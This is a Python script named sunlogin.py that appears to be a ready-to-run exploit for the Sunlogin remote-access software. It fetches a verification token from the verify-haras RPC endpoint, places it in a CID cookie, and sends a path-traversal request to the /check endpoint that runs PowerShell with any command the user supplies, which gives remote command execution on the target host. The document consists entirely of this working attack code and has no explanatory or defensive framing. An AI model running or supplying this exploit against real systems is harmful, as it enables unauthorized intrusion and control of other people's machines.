import sys,getopt,re,requests,random

def main(argv):
    try:
        opts,args = getopt.getopt(argv,"hi:p:c:",[])

    except getopt.GetoptError:
        print('sunlogin.py -i <ip address> -p <port> -c <command>')
        sys.exit(2)

    for opt,arg in opts:
        if opt == '-h':
            print('sunlogin.py -i <ip address> -p <port> -c <command>')
            sys.exit(0)

        if opt == '-p':
            port = arg

        if opt == '-i':
            ipadd = arg

        if opt == '-c':
            command = arg

    address = ipadd + ':' + port
    url = 'http://%s/cgi-bin/rpc?action=verify-haras' % address

    res_cid = requests.get(url)
    cid = re.findall('"verify_string":"(.*?)",', res_cid.text)
    payload = "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20" + command

    url = 'http://' + address + payload

    data = {

        'Host': address,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Cookie': 'CID=%s' % cid[0],
        'Cache-Control': 'max-age=0'
    }

    res = requests.get(url, headers=data, timeout=10)
    print(res.text)
    
if __name__ == "__main__":
   main(sys.argv[1:])
